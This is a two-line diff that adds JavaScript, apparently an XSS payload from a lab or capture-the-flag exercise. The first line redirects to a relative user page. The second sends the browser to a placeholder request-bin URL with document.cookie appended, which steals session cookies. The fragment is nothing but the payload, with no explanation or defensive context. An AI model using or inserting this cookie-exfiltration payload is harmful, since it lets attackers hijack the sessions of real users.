@@ -1,0 +1,2 @@
+location.href="../../user";
+location.href="(request_bin)?"+document.cookie;
